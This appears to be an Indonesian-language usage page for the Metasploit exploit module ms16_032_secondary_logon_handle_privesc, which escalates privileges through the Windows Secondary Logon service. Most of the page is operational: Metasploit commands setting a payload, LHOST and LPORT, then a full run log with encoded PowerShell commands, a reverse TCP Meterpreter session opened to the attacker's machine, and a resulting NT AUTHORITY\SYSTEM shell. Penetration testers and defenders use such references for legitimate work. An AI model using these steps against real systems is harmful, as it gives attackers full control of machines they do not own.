# ms16_032_secondary_logon_handle_privesc

Modul ini mengeksploitasi kurangnya sanitasi (pemrosesan yang aman) terhadap `standard handles` pada Layanan `Secondary Logon` di Windows.

Kerentanan ini diketahui memengaruhi:
- `Windows 7` hingga `Windows 10`
- `Windows Server 2008` hingga `2012`
    (baik versi `32-bit` maupun `64-bit`)

Modul ini hanya akan bekerja pada sistem Windows:
- Yang memiliki `PowerShell` versi `2.0` atau lebih baru
- Dan memiliki dua inti prosesor (`CPU cores`) atau lebih

## Penulis
- James Forshaw
- b33f
- khr0x40sh

## Platform
- `Windows`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[+] Compressed size: 1160
[+] Final command JgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcASAA0AHMASQBBAEoAdgBCAEoAMgAnACsAJwBnAEMAQQAwAHQATgB6AHMAaABYAEMAewAwAH0AaABJAHEAWQBqAEkAegBTACcAKwAnAHkAMAB6AGsAegBUAFUATgBHAEkARABxADQAcwBMAGsAbgBOADEAWABQAE4ASwA4AHMAcwB5AHMALwBMAFQAYwAwAHIAaQBiAFcAeQBDAGkAagBLAFQAMAA0AHQATABzADQAdgBjAHMANAB2AHoAUwB2AFIAVgBOAEIATgBMADEARQB3ADEARgBTAG8AVgBrAGcARgBtAHEAQwBoAFYARgBKAFUAbQBxAHEAawBxAFYAQgByAEQAZQBZAHIAcABCAFYANABoAGIAZwBtADUAMgBVAEQAQQBDAEcAaABTAFAAewAxAH0AZgBBAEEAQQBBACcAKQAtAGYAJwBNACcALAAnAGQAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApAGUAYwBoAG8AIAAnAEEAdwBHAFIASwBjAHUAVwAnADsA
[+] EXECUTING:
powershell.exe -EncodedCommand JgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcASAA0AHMASQBBAEoAdgBCAEoAMgAnACsAJwBnAEMAQQAwAHQATgB6AHMAaABYAEMAewAwAH0AaABJAHEAWQBqAEkAegBTACcAKwAnAHkAMAB6AGsAegBUAFUATgBHAEkARABxADQAcwBMAGsAbgBOADEAWABQAE4ASwA4AHMAcwB5AHMALwBMAFQAYwAwAHIAaQBiAFcAeQBDAGkAagBLAFQAMAA0AHQATABzADQAdgBjAHMANAB2AHoAUwB2AFIAVgBOAEIATgBMADEARQB3ADEARgBTAG8AVgBrAGcARgBtAHEAQwBoAFYARgBKAFUAbQBxAHEAawBxAFYAQgByAEQAZQBZAHIAcABCAFYANABoAGIAZwBtADUAMgBVAEQAQQBDAEcAaABTAFAAewAxAH0AZgBBAEEAQQBBACcAKQAtAGYAJwBNACcALAAnAGQAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApAGUAYwBoAG8AIAAnAEEAdwBHAFIASwBjAHUAVwAnADsA -InputFormat None
[+] Cleaning up 2992
[+] EXECUTING:
powershell.exe -EncodedCommand JgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAewAxAH0ANABzAEkAQQBKADcAQgBKADIAZwBDAEEANAB0ADIAegBTAHYATABMAE0AcgBQAHkAMAAzAE4ASwA0AG0AMQBzAG4ASgBQAEwAVQBFAFMAQwBFAHMAcwB5AGsAeABNAHkAawBrAHQAMQBsAEEAUABMAFUANAB0AFUAdAB7ADAAfQBVAHkAMAA2AHQATABLADQASgBUACcAKwAnAHMAMQBKAFQAUwA3AFIARABTADQAcAB5AHMAeABMAFYANABnAEkAegBrADgAcgB6AFUAcwAnACsAJwBKAHIARgBHAHQAagBrAFkAMQBMAEIAaQByAFkAUgBvAHEAOABUAG8AcQBlAGEAVQA1AE8AVABwAFEAUQAyAHMAQgBxAGQAdgBnAE4AbwBRAEEAQQBBAEEAPQAnACkALQBmACcAZgAnACwAJwBIACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQBlAGMAaABvACAAJwBBAHcARwBSAEsAYwB1AFcAJwA7AA== -InputFormat None
[*] PS1 loaded from /usr/share/metasploit-framework/data/exploits/CVE-2016-0099/cve_2016_0099.ps1
[*] Writing payload file, C:\Users\admin\AppData\Local\Temp\kUfJJMHXkRUy.ps1...
[*] Compressing script contents...
[+] Compressed size: 3814
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 872

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:63
+         $knIv6 = [Ntdll]::NtImpersonateThread($jrB, $jrB, [ref]$m4lQ <<<< )
    + CategoryInfo          : InvalidOperation: (m4lQ:Token) [], RuntimeExcept 
   ion
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "0", with value: "", for "DuplicateToken" to type "Syst
em.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:37
+     $knIv6 = [Advapi32]::DuplicateToken <<<< ($k5M, 2, [ref]$lo)
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

Ttjuxgel9ZOaOqd9rwHKKrdIb1jgYS2b
[+] Executed on target machine.
[*] Sending stage (177734 bytes) to 192.168.1.53
[*] Meterpreter session 14 opened (192.168.1.11:4444 -> 192.168.1.53:49161) at 2025-05-17 05:52:19 +0700
[+] Deleted C:\Users\admin\AppData\Local\Temp\kUfJJMHXkRUy.ps1

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc/)
